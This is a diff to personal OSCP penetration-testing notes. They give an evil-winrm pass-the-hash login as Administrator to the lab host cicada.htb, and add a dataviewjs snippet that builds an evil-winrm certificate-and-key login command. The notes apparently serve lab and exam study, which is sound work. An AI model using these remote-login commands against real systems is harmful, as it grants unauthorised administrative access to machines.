@@ -23,3 +23,18 @@ SeBackupPrivilege
 ```
 evil-winrm -u Administrator -H 2b87e7c93a3e8a0ea4a581937016f341 -i cicada.htb
 ```
+
+PFX Pass
+
+filename::
+```dataviewjs
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");
+const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND";
+
+const pagea = dv.page("Synced OSCP Notes/Small Toolkit/Tools/Evil-Winrm");
+const filename = pagea?.["filename"] ?? "NO FILENAME FOUND";
+
+const command = `evil-winrm -i ${discoveredDomain} -S -k ${filename}.key -c ${filename}.crt`;
+
+dv.paragraph("```bash\n" + command + "\n```");
+```
